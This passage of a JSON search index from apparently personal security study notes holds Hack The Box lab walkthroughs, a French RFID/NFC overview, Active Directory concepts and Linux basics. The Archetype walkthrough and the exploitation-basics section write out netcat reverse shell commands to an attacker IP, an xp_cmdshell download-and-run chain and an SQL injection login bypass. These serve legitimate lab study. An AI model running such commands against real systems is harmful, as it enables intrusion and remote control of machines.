file","title":"Dancing"},{"location":"htb/htb-starting_point/#appointment","text":"Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> Apache/2.4.38 (Debian) : 80/tcp Exploitation: SQLi: username = admin & password = ' OR 1=1 # Flag: Displayed onscreen.","title":"Appointment"},{"location":"htb/htb-starting_point/#sequel","text":"Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> mysql : 3306/tcp Exploitation: mysql: $ mysql -h <IP> -u root mysql: MariaDB [(none)]> SHOW databases; mysql: MariaDB [(none)]> USE htb; mysql: MariaDB [(htb)]> SHOW tables; mysql: MariaDB [(htb)]> SELECT * FROM config; Flag: Read from table.","title":"Sequel"},{"location":"htb/htb-starting_point/#crocodile","text":"Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> ftp-anon : 21/tcp && Apache/2.4.41 (Ubuntu) : 80/tcp Exploitation: ftp: $ ftp <IP> --> user : Anonymous / password : ftp: ftp> dir --> list all files available ftp: ftp> get allowed.userlist --> download file ftp: ftp> get allowed.userlist.passwd --> download file dirsearch: $ dirsearch -u http://<IP>/ --> found /login.php page Use creds found in both files Flag: Displayed onscreen.","title":"Crocodile"},{"location":"htb/htb-starting_point/#archetype","text":"Enumeration: Nmap: $ nmap -v -A -T4 <IP> --> smb : 445/tcp && mssql : 1433/tcp Exploitation: smbclient: $ smbclient -L <IP> --> list the available shares smbclient: $ smbclient -N \\\\\\\\<IP>\\\\<share> --> connect to share -N = no auth smbclient: smb: \\> get prod.dtsConfig --> credentials found in file impacket-mssqlclient: $ impacket-mssqlclient ARCHETYPE/sql_svc:<password>@<IP> -windows-auth --> connect to mssql MSSQL: SQL> enable_xp_cmdshell; --> enable xp_cmdshell to run commands MSSQL: SQL> RECONFIGURE; MSSQL: SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget <link to netcat executable> -outfile nc64.exe --> download netcat in folder where we have enough privileges (downloads) netcat: nc -nvlp 4444 --> netcat listening on our machine MSSQL: SQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe <MyIP> 4444 --> target machine is connecting to our listening netcat, and will run through cmd.exe everythin our netcat sends, to send it back to us netcat->cmd: C:\\Users\\sql_svc\\Downloads>powershell --> listening netcat is now a powershell shell netcat->powershell: PS> wget <link to winpeas executable> -outfile winPEASx64.exe --> download winPEAS on target machine","title":"Archetype"},{"location":"iot/rfid_prez/","text":"Radio Frequency IDentification (RFID) Technologie d'identification utilisant la communication par ondes radio\u00e9lectriques. Les tags (marqueurs) RFID correspondent \u00e0 un couple puce \u00e9lectronique / antenne , appos\u00e9 sur un produit permettant l' identification \u00e0 distance gr\u00e2ce \u00e0 un lecteur qui capte les informations contenues dans la puce. Ces tags peuvent \u00eatre de deux types : actif ou passif . Exemple : num\u00e9ro de produit, num\u00e9ro de lot, description sommaire... 1. Les cat\u00e9gories de tags 1.1. Tags actifs Tout d'abord, il y a les tags actifs qui sont munis d'une batterie interne qui fournit constamment en courant la puce, et permet l'amplification de l'\u00e9mission (allant de dizaines de m\u00e8tres \u00e0 quelques centaines). Ces derniers ont l'avantage d'avoir une distance de lecture plus importante donc, une plus grande capacit\u00e9 m\u00e9moire , et un temps de r\u00e9ponse plus rapide . Cependant, la dur\u00e9e de vie du tag d\u00e9pend de la dur\u00e9e de vie de la batterie. Exemple : Transpondeurs d'avion, syst\u00e8mes Bluetooth Low Energy (BLE)... 1.2. Tags passifs Les tags passifs quant \u00e0 eu n'ont pas de batterie , c'est le signal \u00e9lectromagn\u00e9tique \u00e9mis par le lecteur qui permet au tag de fonctionner par induction de courant. Lorsque le courant induit est suffisant, la puce est correctement aliment\u00e9e et transmet l'information. Du fait de l'absence de batterie, la distance d'\u00e9mission est plut\u00f4t courte (quelques m\u00e8tres) Exemple : Anti-vol de supermarch\u00e9... 1.3. Tags semi-actifs Il existe de plus des tags dits semi-actifs , qui sont des tags actifs n\u00e9cessitant une action humaine pour \u00e9mettre l'information. 1.4. Tags semi-passifs De m\u00eame, les tags dits semi-passifs sont des tags ayant une source d'\u00e9nergie interne , cependant elle n'est utilis\u00e9e que pour le fonctionnement de la puce , et non pas pour l'\u00e9mission d'information 1.5. Tags dits \"battery-powered\" Il existe des tags actifs pouvant \u00eatre mis en mode silencieux et r\u00e9activ\u00e9s plus tard lorsque ceux-ci re\u00e7oivent un signal de lecteur. Il est donc plus pr\u00e9cis de les appeler tags battery-powered . Ils ont donc une source d'\u00e9nergie pour constamment alimenter la puce, mais peuvent \u00eatre programm\u00e9s de mani\u00e8re \u00e0 \u00e9conomiser la batterie, en ne l'activant que sous certaines conditions, ou \u00e0 intervales r\u00e9guliers. Ainsi, ces tags peuvent incorporer un ou plusieurs autre capteurs , relevant humidit\u00e9, temp\u00e9rature, choc, vibrations... 2. Les m\u00e9moires de tags Une autre distinction peut \u00eatre faite entre les tags suivant leur m\u00e9moire. Les tags peuvent donc \u00eatre class\u00e9s comme read-only (lecture seule), Write One Read Many (WORM) ou read/write (r\u00e9-inscriptible) 2.1 M\u00e9moire Read-only Les tags \u00e0 m\u00e9moire lecture seule sont typiquement des tags passifs , semblables \u00e0 des codes barres, comportant peu d'information , avec une m\u00e9moire non modifiable \u00e0 moins de reconfigurer la puce \u00e9lectroniquement. Ces tags sont disponibles en diff\u00e9rentes versions : \u00e0 distance de lecture, nombre de bits de donn\u00e9es, et temp\u00e9rature de fonctionnement variants. 2.2 M\u00e9moire WORM Les tags \u00e0 m\u00e9moire WORM (trad : \u00e9crite une fois, lue plusieurs fois) permettent d'\u00eatre vendus vierge , afin que l'acheteur puisse y mettre ses propres donn\u00e9es, mais une fois ces donn\u00e9es inscrites, le tag devient un tag Read-only. 2.3. M\u00e9moire Read/Write Les tags \u00e0 m\u00e9moire r\u00e9-inscriptible fonctionnent de la m\u00eame mani\u00e8re qu'une m\u00e9moire disque, car les donn\u00e9es peuvent \u00eatre \u00e9dit\u00e9es, supprim\u00e9es, de nouvelles peuvent \u00eatre ajout\u00e9es un nombre illimit\u00e9 de fois. Bandes fr\u00e9quence En plus des diff\u00e9rents types de tags, les syst\u00e8mes RFID varient suivant la fr\u00e9quence \u00e0 laquelle ils fonctionnent. Les quatre bandes de fr\u00e9quence radio primaire, allant de 30 kHz \u00e0 5.8 GHz, sont les basses fr\u00e9quences, les hautes fr\u00e9quences, les ultra hautes fr\u00e9quences, et les fr\u00e9quences micro-onde. Pour communiquer, tag et lecteur doivent \u00eatre sur la m\u00eame plage de fr\u00e9quences, ainsi parmi les \u00e9tiquettes passives, on retrouve trois familles de fr\u00e9quences : les fr\u00e9quences basses (125-135 kHz) la fr\u00e9quence haute (13.56 MHz) les fr\u00e9quences ultra hautes UHF (865-928 MHz) Le choix de la fr\u00e9quence d\u00e9pend de l' application , de la taille du tag , et de la distance de lecture de ce dernier. En g\u00e9n\u00e9ral, plus la fr\u00e9quence est haute, plus les \u00e9changes sont rapides, et plus c'est cher. Basse fr\u00e9quence Dans la gamme des basses fr\u00e9quences (30-300kHz), seule la bande de 125 \u00e0 135 kHz est utilis\u00e9e en RFID. Cette bande de fr\u00e9quence est g\u00e9n\u00e9ralement utilis\u00e9e avec des tags passifs avec de courtes distances de lecture (quelques centim\u00e8tres), et \u00e0 moindre co\u00fbt . \u00c0 cette fr\u00e9quence, les tags fonctionnent g\u00e9n\u00e9ralement bien m\u00eame dans un contexte humide (pluie), et aux alentours de m\u00e9taux. Exemple : contr\u00f4le d'acc\u00e8s, identification animale, suivi des actifs... Haute fr\u00e9quence Les hautes fr\u00e9quences (3-30 MHz) sont souvent r\u00e9duites \u00e0 la seule fr\u00e9quence : 13.56 MHz . Cette fr\u00e9quence permet un \u00e9change de donn\u00e9es rapide malgr\u00e9 le fait qu'en pratique les tags utilis\u00e9s sont g\u00e9n\u00e9ralement passifs, et une distance de lecture allant jusqu'\u00e0 1 m\u00e8tre . Cette fr\u00e9quence assure une certaine robustesse face aux \u00e9l\u00e9ments environnementaux, tels que l'eau ou la poussi\u00e8re. Exemple : biblioth\u00e8ques, manufactures pharmaceutiques, e-passeport... Ultra haute fr\u00e9quence Les tags passifs varient entre 865-868 MHz en Europe , et 902-928 MHz aux Etats-Unis , tandis que les tags actifs varient entre 315-433 MHz . Les ultra hautes fr\u00e9quences permettent une distance de lecture plus importante (3 \u00e0 6 m\u00e8tres pour les tags passifs, plus de 30 m\u00e8tres pour les tags actifs) ainsi qu'un d\u00e9bit plus cons\u00e9quent que les bandes pr\u00e9c\u00e9dentes. Exemple : tr\u00e8s utilis\u00e9 en supply-chain... Compl\u00e9ment Type de f\u00e9quence Fr\u00e9quence de fonctionnement Distance de lecture (m) Taux de transfert Technologies Normes Basse fr\u00e9quence 125-135 kHz 0,5 1 kb/s EM4102/4200, EM4450/4550, TEMIC AT5567/AT5577, Hitag 1, Hitag 2, Hitag S2048 ISO 142231, ISO 18000-2 Haute fr\u00e9quence 13,56 MHz 1 25 kb/s Mifare Classic 1k/4k, Mifare Ultralight, Mifare DESfire EV1/EV2, NTAG... ISO 14443, ISO 15693, ISO 18000-3 Ultra haute fr\u00e9quence 865-868 MHz (EU), 902-928 MHz (US) 3-6 28 kb/s ISO 18000-6 De plus, lorsque l'\u00e9mission se fait \u00e0 tr\u00e8s haute fr\u00e9quence, on parle de champ lointain , sinon on se situe dans le champ proche . Dans le cas du champ lointain, le tag et le lecteur utilisent la composante \u00e9lectrique de l'onde radio, tandis que dans le cas du champ proche, c'est la composante magn\u00e9tique . Near Field Communication (NFC) Le NFC (Near Field Communication), soit communication en champ proche, est donc un sous-ensemble particulier de la RFID. Il consiste \u00e0 communiquer \u00e0 haute fr\u00e9quence (\u00e0 13.56MHz ), afin d' \u00e9changer des donn\u00e9es de mani\u00e8re fluide et rapide. Ce qui s\u00e9duit, c'est la distance de lecture (de l'ordre de quelques centim\u00e8tres), assurant une s\u00e9curit\u00e9 suppl\u00e9mentaire. Exemple : Avec un smartphone NFC vous pouvez payer ou prendre les transports en commun, simplement parce que le smartphone \u00e9mule la carte \u00e0 puce sans contact \u00e0 13.56MHz qu'attend le terminal de paiement ou le valideur. Ainsi, le NFC est le RFID utilisent la m\u00eame technologie, mais pour deux activit\u00e9s diff\u00e9rentes. Sources https://ela.fr/rfid-active-vs-rfid-passive-quelles-differences.html https://www.futura-sciences.com/tech/definitions/tech-rfid-4187/ https://www.springcard.com/fr/blog/news/what-is-the-difference-between-rfid-and-nfc https://www.frandroid.com/comment-faire/comment-fonctionne-la-technologie/237303_lenfc-2 https://www.digitaltrends.com/mobile/what-is-nfc/ https://cdn.intechopen.com/pdfs/6177.pdf https://www.barcoda.fr/content/33-mieux-comprendre-la-technologie-rfid","title":"RFID Overview (Fr)"},{"location":"iot/rfid_prez/#radio-frequency-identification-rfid","text":"Technologie d'identification utilisant la communication par ondes radio\u00e9lectriques. Les tags (marqueurs) RFID correspondent \u00e0 un couple puce \u00e9lectronique / antenne , appos\u00e9 sur un produit permettant l' identification \u00e0 distance gr\u00e2ce \u00e0 un lecteur qui capte les informations contenues dans la puce. Ces tags peuvent \u00eatre de deux types : actif ou passif . Exemple : num\u00e9ro de produit, num\u00e9ro de lot, description sommaire...","title":"Radio Frequency IDentification (RFID)"},{"location":"iot/rfid_prez/#1-les-categories-de-tags","text":"","title":"1. Les cat\u00e9gories de tags"},{"location":"iot/rfid_prez/#11-tags-actifs","text":"Tout d'abord, il y a les tags actifs qui sont munis d'une batterie interne qui fournit constamment en courant la puce, et permet l'amplification de l'\u00e9mission (allant de dizaines de m\u00e8tres \u00e0 quelques centaines). Ces derniers ont l'avantage d'avoir une distance de lecture plus importante donc, une plus grande capacit\u00e9 m\u00e9moire , et un temps de r\u00e9ponse plus rapide . Cependant, la dur\u00e9e de vie du tag d\u00e9pend de la dur\u00e9e de vie de la batterie. Exemple : Transpondeurs d'avion, syst\u00e8mes Bluetooth Low Energy (BLE)...","title":"1.1. Tags actifs"},{"location":"iot/rfid_prez/#12-tags-passifs","text":"Les tags passifs quant \u00e0 eu n'ont pas de batterie , c'est le signal \u00e9lectromagn\u00e9tique \u00e9mis par le lecteur qui permet au tag de fonctionner par induction de courant. Lorsque le courant induit est suffisant, la puce est correctement aliment\u00e9e et transmet l'information. Du fait de l'absence de batterie, la distance d'\u00e9mission est plut\u00f4t courte (quelques m\u00e8tres) Exemple : Anti-vol de supermarch\u00e9...","title":"1.2. Tags passifs"},{"location":"iot/rfid_prez/#13-tags-semi-actifs","text":"Il existe de plus des tags dits semi-actifs , qui sont des tags actifs n\u00e9cessitant une action humaine pour \u00e9mettre l'information.","title":"1.3. Tags semi-actifs"},{"location":"iot/rfid_prez/#14-tags-semi-passifs","text":"De m\u00eame, les tags dits semi-passifs sont des tags ayant une source d'\u00e9nergie interne , cependant elle n'est utilis\u00e9e que pour le fonctionnement de la puce , et non pas pour l'\u00e9mission d'information","title":"1.4. Tags semi-passifs"},{"location":"iot/rfid_prez/#15-tags-dits-battery-powered","text":"Il existe des tags actifs pouvant \u00eatre mis en mode silencieux et r\u00e9activ\u00e9s plus tard lorsque ceux-ci re\u00e7oivent un signal de lecteur. Il est donc plus pr\u00e9cis de les appeler tags battery-powered . Ils ont donc une source d'\u00e9nergie pour constamment alimenter la puce, mais peuvent \u00eatre programm\u00e9s de mani\u00e8re \u00e0 \u00e9conomiser la batterie, en ne l'activant que sous certaines conditions, ou \u00e0 intervales r\u00e9guliers. Ainsi, ces tags peuvent incorporer un ou plusieurs autre capteurs , relevant humidit\u00e9, temp\u00e9rature, choc, vibrations...","title":"1.5. Tags dits \"battery-powered\""},{"location":"iot/rfid_prez/#2-les-memoires-de-tags","text":"Une autre distinction peut \u00eatre faite entre les tags suivant leur m\u00e9moire. Les tags peuvent donc \u00eatre class\u00e9s comme read-only (lecture seule), Write One Read Many (WORM) ou read/write (r\u00e9-inscriptible)","title":"2. Les m\u00e9moires de tags"},{"location":"iot/rfid_prez/#21-memoire-read-only","text":"Les tags \u00e0 m\u00e9moire lecture seule sont typiquement des tags passifs , semblables \u00e0 des codes barres, comportant peu d'information , avec une m\u00e9moire non modifiable \u00e0 moins de reconfigurer la puce \u00e9lectroniquement. Ces tags sont disponibles en diff\u00e9rentes versions : \u00e0 distance de lecture, nombre de bits de donn\u00e9es, et temp\u00e9rature de fonctionnement variants.","title":"2.1 M\u00e9moire Read-only"},{"location":"iot/rfid_prez/#22-memoire-worm","text":"Les tags \u00e0 m\u00e9moire WORM (trad : \u00e9crite une fois, lue plusieurs fois) permettent d'\u00eatre vendus vierge , afin que l'acheteur puisse y mettre ses propres donn\u00e9es, mais une fois ces donn\u00e9es inscrites, le tag devient un tag Read-only.","title":"2.2 M\u00e9moire WORM"},{"location":"iot/rfid_prez/#23-memoire-readwrite","text":"Les tags \u00e0 m\u00e9moire r\u00e9-inscriptible fonctionnent de la m\u00eame mani\u00e8re qu'une m\u00e9moire disque, car les donn\u00e9es peuvent \u00eatre \u00e9dit\u00e9es, supprim\u00e9es, de nouvelles peuvent \u00eatre ajout\u00e9es un nombre illimit\u00e9 de fois.","title":"2.3. M\u00e9moire Read/Write"},{"location":"iot/rfid_prez/#bandes-frequence","text":"En plus des diff\u00e9rents types de tags, les syst\u00e8mes RFID varient suivant la fr\u00e9quence \u00e0 laquelle ils fonctionnent. Les quatre bandes de fr\u00e9quence radio primaire, allant de 30 kHz \u00e0 5.8 GHz, sont les basses fr\u00e9quences, les hautes fr\u00e9quences, les ultra hautes fr\u00e9quences, et les fr\u00e9quences micro-onde. Pour communiquer, tag et lecteur doivent \u00eatre sur la m\u00eame plage de fr\u00e9quences, ainsi parmi les \u00e9tiquettes passives, on retrouve trois familles de fr\u00e9quences : les fr\u00e9quences basses (125-135 kHz) la fr\u00e9quence haute (13.56 MHz) les fr\u00e9quences ultra hautes UHF (865-928 MHz) Le choix de la fr\u00e9quence d\u00e9pend de l' application , de la taille du tag , et de la distance de lecture de ce dernier. En g\u00e9n\u00e9ral, plus la fr\u00e9quence est haute, plus les \u00e9changes sont rapides, et plus c'est cher.","title":"Bandes fr\u00e9quence"},{"location":"iot/rfid_prez/#basse-frequence","text":"Dans la gamme des basses fr\u00e9quences (30-300kHz), seule la bande de 125 \u00e0 135 kHz est utilis\u00e9e en RFID. Cette bande de fr\u00e9quence est g\u00e9n\u00e9ralement utilis\u00e9e avec des tags passifs avec de courtes distances de lecture (quelques centim\u00e8tres), et \u00e0 moindre co\u00fbt . \u00c0 cette fr\u00e9quence, les tags fonctionnent g\u00e9n\u00e9ralement bien m\u00eame dans un contexte humide (pluie), et aux alentours de m\u00e9taux. Exemple : contr\u00f4le d'acc\u00e8s, identification animale, suivi des actifs...","title":"Basse fr\u00e9quence"},{"location":"iot/rfid_prez/#haute-frequence","text":"Les hautes fr\u00e9quences (3-30 MHz) sont souvent r\u00e9duites \u00e0 la seule fr\u00e9quence : 13.56 MHz . Cette fr\u00e9quence permet un \u00e9change de donn\u00e9es rapide malgr\u00e9 le fait qu'en pratique les tags utilis\u00e9s sont g\u00e9n\u00e9ralement passifs, et une distance de lecture allant jusqu'\u00e0 1 m\u00e8tre . Cette fr\u00e9quence assure une certaine robustesse face aux \u00e9l\u00e9ments environnementaux, tels que l'eau ou la poussi\u00e8re. Exemple : biblioth\u00e8ques, manufactures pharmaceutiques, e-passeport...","title":"Haute fr\u00e9quence"},{"location":"iot/rfid_prez/#ultra-haute-frequence","text":"Les tags passifs varient entre 865-868 MHz en Europe , et 902-928 MHz aux Etats-Unis , tandis que les tags actifs varient entre 315-433 MHz . Les ultra hautes fr\u00e9quences permettent une distance de lecture plus importante (3 \u00e0 6 m\u00e8tres pour les tags passifs, plus de 30 m\u00e8tres pour les tags actifs) ainsi qu'un d\u00e9bit plus cons\u00e9quent que les bandes pr\u00e9c\u00e9dentes. Exemple : tr\u00e8s utilis\u00e9 en supply-chain...","title":"Ultra haute fr\u00e9quence"},{"location":"iot/rfid_prez/#complement","text":"Type de f\u00e9quence Fr\u00e9quence de fonctionnement Distance de lecture (m) Taux de transfert Technologies Normes Basse fr\u00e9quence 125-135 kHz 0,5 1 kb/s EM4102/4200, EM4450/4550, TEMIC AT5567/AT5577, Hitag 1, Hitag 2, Hitag S2048 ISO 142231, ISO 18000-2 Haute fr\u00e9quence 13,56 MHz 1 25 kb/s Mifare Classic 1k/4k, Mifare Ultralight, Mifare DESfire EV1/EV2, NTAG... ISO 14443, ISO 15693, ISO 18000-3 Ultra haute fr\u00e9quence 865-868 MHz (EU), 902-928 MHz (US) 3-6 28 kb/s ISO 18000-6 De plus, lorsque l'\u00e9mission se fait \u00e0 tr\u00e8s haute fr\u00e9quence, on parle de champ lointain , sinon on se situe dans le champ proche . Dans le cas du champ lointain, le tag et le lecteur utilisent la composante \u00e9lectrique de l'onde radio, tandis que dans le cas du champ proche, c'est la composante magn\u00e9tique .","title":"Compl\u00e9ment"},{"location":"iot/rfid_prez/#near-field-communication-nfc","text":"Le NFC (Near Field Communication), soit communication en champ proche, est donc un sous-ensemble particulier de la RFID. Il consiste \u00e0 communiquer \u00e0 haute fr\u00e9quence (\u00e0 13.56MHz ), afin d' \u00e9changer des donn\u00e9es de mani\u00e8re fluide et rapide. Ce qui s\u00e9duit, c'est la distance de lecture (de l'ordre de quelques centim\u00e8tres), assurant une s\u00e9curit\u00e9 suppl\u00e9mentaire. Exemple : Avec un smartphone NFC vous pouvez payer ou prendre les transports en commun, simplement parce que le smartphone \u00e9mule la carte \u00e0 puce sans contact \u00e0 13.56MHz qu'attend le terminal de paiement ou le valideur. Ainsi, le NFC est le RFID utilisent la m\u00eame technologie, mais pour deux activit\u00e9s diff\u00e9rentes.","title":"Near Field Communication (NFC)"},{"location":"iot/rfid_prez/#sources","text":"https://ela.fr/rfid-active-vs-rfid-passive-quelles-differences.html https://www.futura-sciences.com/tech/definitions/tech-rfid-4187/ https://www.springcard.com/fr/blog/news/what-is-the-difference-between-rfid-and-nfc https://www.frandroid.com/comment-faire/comment-fonctionne-la-technologie/237303_lenfc-2 https://www.digitaltrends.com/mobile/what-is-nfc/ https://cdn.intechopen.com/pdfs/6177.pdf https://www.barcoda.fr/content/33-mieux-comprendre-la-technologie-rfid","title":"Sources"},{"location":"practical_ethical_hacking/peh-ad_attack/","text":"Active Directory Overview What : Developed by Microsoft for Windows domain networks management. Stores information related to objects (computers, users, printers...) : Windows Phone Book . Authenticates Windows devices using Kerberos tickets. Authenticated non-Windows devices via RADIUS or LDAP . Why : Most commonly used identity management service in the world : 95% of Fortune 1000 use it. Can be exploited without ever attacking patchable exploits : instead abuse features, trusts, components ... 1. Physical AD Components Domain Controller: A domain controller is a server with the Active Directory Domain Services server role installed that has specifically been promoted to a domain controller. Hosts a copy of the AD DS directory store ; Provide authentication and authorization services ; Replicate updates to other domain controllers in the domain and forest ; Allow administrative access to manage user accounts and network resources. Active Directory Domain Service Data Store: The AD DS data store contains the database files and processes that store and manage directoru information for users, services, and applications. It is the Ntds.dit file ; Is stored by default in the %SystemRoot%\\NTDS folder on all DC ; Is accessible only through the domain controller processes and protocols. 2. Logical AD Components AD DS Schema Defines every type of object that can be stored in the directory Enforce rules regarding object creation and configuration Object Types Function Examples Class Object What objects can be created in the directory User, Computer ... Attribute Object Information that can be attached to and object Display name Domains Domains are used to group and manage objects in an oragnization. An administrative boundary for applying policies to groups of objects ; A replication boundary for replicating data between two domain controllers ; An authentication and authorization boundary that provides a way to limit to the scope of access to resources. Trees A domain tree is a hierarchy of domains in AD DS. * Share a contiguous namespace with the parent domain Can have additional child domains By default create a two-way transitive trust with other domains Forests A forest is a collection of one or more domain trees Share a common schema Share a common configuration partition Share a common global catalog to enable searching Enable trusts between all domains in the forests Share the Entreprise Admins and Schema Admin groups Organizational Units (OUs) OUs are Active Directory containers that can contain users, groups, computers, and other OUs Represent your organization hierarchically and/or logically Manage a collection of objects in a consistent way Delegate permissions to administer groups of objects Apply policies Trusts Trusts provide a mechanism for users to gain access to resources in another domain Types of Trusts Description Diagram Directional The trust direction flows from trusting domain to the trusted domain Transitive The trust relationship is extended beyond a two-domain trust to include other trusted domains All domains in a forest trust all other domains in the forest Trusts can extend outside the forest Objects Object Description User Enables network resource access for a user InetOrgPerson Similar to a user account, used for compatibility with other","title":"Active Directory"},{"location":"practical_ethical_hacking/peh-ad_attack/#active-directory","text":"","title":"Active Directory"},{"location":"practical_ethical_hacking/peh-ad_attack/#overview","text":"What : Developed by Microsoft for Windows domain networks management. Stores information related to objects (computers, users, printers...) : Windows Phone Book . Authenticates Windows devices using Kerberos tickets. Authenticated non-Windows devices via RADIUS or LDAP . Why : Most commonly used identity management service in the world : 95% of Fortune 1000 use it. Can be exploited without ever attacking patchable exploits : instead abuse features, trusts, components ...","title":"Overview"},{"location":"practical_ethical_hacking/peh-ad_attack/#1-physical-ad-components","text":"","title":"1. Physical AD Components"},{"location":"practical_ethical_hacking/peh-ad_attack/#domain-controller","text":"A domain controller is a server with the Active Directory Domain Services server role installed that has specifically been promoted to a domain controller. Hosts a copy of the AD DS directory store ; Provide authentication and authorization services ; Replicate updates to other domain controllers in the domain and forest ; Allow administrative access to manage user accounts and network resources.","title":"Domain Controller:"},{"location":"practical_ethical_hacking/peh-ad_attack/#active-directory-domain-service-data-store","text":"The AD DS data store contains the database files and processes that store and manage directoru information for users, services, and applications. It is the Ntds.dit file ; Is stored by default in the %SystemRoot%\\NTDS folder on all DC ; Is accessible only through the domain controller processes and protocols.","title":"Active Directory Domain Service Data Store:"},{"location":"practical_ethical_hacking/peh-ad_attack/#2-logical-ad-components","text":"","title":"2. Logical AD Components"},{"location":"practical_ethical_hacking/peh-ad_attack/#ad-ds-schema","text":"Defines every type of object that can be stored in the directory Enforce rules regarding object creation and configuration Object Types Function Examples Class Object What objects can be created in the directory User, Computer ... Attribute Object Information that can be attached to and object Display name","title":"AD DS Schema"},{"location":"practical_ethical_hacking/peh-ad_attack/#domains","text":"Domains are used to group and manage objects in an oragnization. An administrative boundary for applying policies to groups of objects ; A replication boundary for replicating data between two domain controllers ; An authentication and authorization boundary that provides a way to limit to the scope of access to resources.","title":"Domains"},{"location":"practical_ethical_hacking/peh-ad_attack/#trees","text":"A domain tree is a hierarchy of domains in AD DS. * Share a contiguous namespace with the parent domain Can have additional child domains By default create a two-way transitive trust with other domains","title":"Trees"},{"location":"practical_ethical_hacking/peh-ad_attack/#forests","text":"A forest is a collection of one or more domain trees Share a common schema Share a common configuration partition Share a common global catalog to enable searching Enable trusts between all domains in the forests Share the Entreprise Admins and Schema Admin groups","title":"Forests"},{"location":"practical_ethical_hacking/peh-ad_attack/#organizational-units-ous","text":"OUs are Active Directory containers that can contain users, groups, computers, and other OUs Represent your organization hierarchically and/or logically Manage a collection of objects in a consistent way Delegate permissions to administer groups of objects Apply policies","title":"Organizational Units (OUs)"},{"location":"practical_ethical_hacking/peh-ad_attack/#trusts","text":"Trusts provide a mechanism for users to gain access to resources in another domain Types of Trusts Description Diagram Directional The trust direction flows from trusting domain to the trusted domain Transitive The trust relationship is extended beyond a two-domain trust to include other trusted domains All domains in a forest trust all other domains in the forest Trusts can extend outside the forest","title":"Trusts"},{"location":"practical_ethical_hacking/peh-ad_attack/#objects","text":"Object Description User Enables network resource access for a user InetOrgPerson Similar to a user account, used for compatibility with other","title":"Objects"},{"location":"practical_ethical_hacking/peh-buffer_overflow/","text":"Buffer Overflows","title":"Buffer Overflows"},{"location":"practical_ethical_hacking/peh-buffer_overflow/#buffer-overflows","text":"","title":"Buffer Overflows"},{"location":"practical_ethical_hacking/peh-exploitation_basics/","text":"Exploitation Basics 1. Shell Reverse Shell : The target connects to the attacker. Bind Shell : The attacker connects to the target. 1.1. Reverse Shell Example Attacker nc -nvlp 4444 Target nc <attacker IP> 4444 -e /bin/sh 1.2. Bind Shell Example Attacker nc <target IP> 4444 Target nc -nvlp 4444 -e /bin/sh 2. Payloads Non-staged Staged Sends exploit shellcode all at once Sends payload in stages Larger in size and won't always work Can be less stable Example: windows/meterpreter _ reverse_tcp Example: windows/meterpreter / reverse_tcp 3. Basic commands once we have access to the machine Try to find the IP(s) of the machine Check the arp table / route Check the sudo privileges Check the /etc/passwd file in order to see the different users of the machine (from 500) Check the /etc/shadow file in order to see the password hashes. 4. Brute Force Attacks","title":"Exploitation Basics"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#exploitation-basics","text":"","title":"Exploitation Basics"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#1-shell","text":"Reverse Shell : The target connects to the attacker. Bind Shell : The attacker connects to the target.","title":"1. Shell"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#11-reverse-shell","text":"Example Attacker nc -nvlp 4444 Target nc <attacker IP> 4444 -e /bin/sh","title":"1.1. Reverse Shell"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#12-bind-shell","text":"Example Attacker nc <target IP> 4444 Target nc -nvlp 4444 -e /bin/sh","title":"1.2. Bind Shell"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#2-payloads","text":"Non-staged Staged Sends exploit shellcode all at once Sends payload in stages Larger in size and won't always work Can be less stable Example: windows/meterpreter _ reverse_tcp Example: windows/meterpreter / reverse_tcp","title":"2. Payloads"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#3-basic-commands-once-we-have-access-to-the-machine","text":"Try to find the IP(s) of the machine Check the arp table / route Check the sudo privileges Check the /etc/passwd file in order to see the different users of the machine (from 500) Check the /etc/shadow file in order to see the password hashes.","title":"3. Basic commands once we have access to the machine"},{"location":"practical_ethical_hacking/peh-exploitation_basics/#4-brute-force-attacks","text":"","title":"4. Brute Force Attacks"},{"location":"practical_ethical_hacking/peh-linux/","text":"Introduction to Linux 1. Navigating the File System $ pwd : Present working directory. $ cd /path/to/file : Change directory. $ ls -la : List everything in the folder, even hidden files $ mkdir /path/to/file : Make directory. $ rmdir /path/to/file : Remove directory. $ cp /path/to/source /path/to/destination : Copy file. $ rm /path/to/file : Remove file. $ mv /path/to/source /path/to/destination : Move file or rename it. $ locate <filename> : Locate a file. \\--> Use $ updatedb to refresh the database. $ echo \"something\" : Displays \"something\". $ <command> > /path/to/file : Writes the output of the command in the file. $ echo \"Hello World!\" > test.txt # Creates a file test.txt in the current directory with \"Hello World!\" written inside. $ man <command> : Manual page for that command. 2. Users and Privileges When doing a ls -la we can see the file details. $ ls -la total 148 drwxr-xr-x 14 kali kali 4096 Mar 3 17 :16 . drwxr-xr-x 3 root root 4096 Jul 27 2020 .. -rwxr--r-- 1 walbert support 0 Oct 31 11 :06 test $ cat /etc/passwd to see users. $ passwd : Change password of the current user. $ cat /path/to/file : Displays the file in terminal. $ chmod 777 /path/to/file : Change mode (rwx) of the file. $ adduser <username> : Add a user \"username\". $ su <user> : Switch user. $ sudo <command> : Super User DO command. Sudoers file: anyone in there can use the sudo command. 3. Network Commands $ ifconfig : Shows the different network information. $ iwconfig : Wireless network information. $ ping <ip> : Sends ICMP packet (ping) to the given ip. $ arp -a : Shows the IP addresses talking to you and the MAC addresses associated. $ netstat -ano : Shows active connection on your machine (interesting during pentest to see if the machine is talking to another one). $ route : Prints the routing table. These are becoming deprecated, now the ip command is the goto : $ ip a : IP address, Network, Broadcast $ ip n : ARP table $ ip r : Routing table 4. Installing and Updating tools $ apt update && apt upgrade # Updates the system 4.1. Install package $ apt install pip # Installs pip 4.2. From Github $ cd /opt # Downloads in the opt file : good practice $ git clone https://github.com/username/repository.git # Clones the repository on the local machine 4.3. Install gedit $ sudo apt install gedit $ gedit test.txt 5. Viewing, Creating and Editing Files $ echo \"test\" > test.txt # Overwrites a test.txt file with \"test\" inside $ cat test.txt test $ echo \"test2\" >> test.txt # Appends the echo standard output to the file test.txt $ cat test.txt test test2 $ touch /path/to/file : Creates an empty file with the 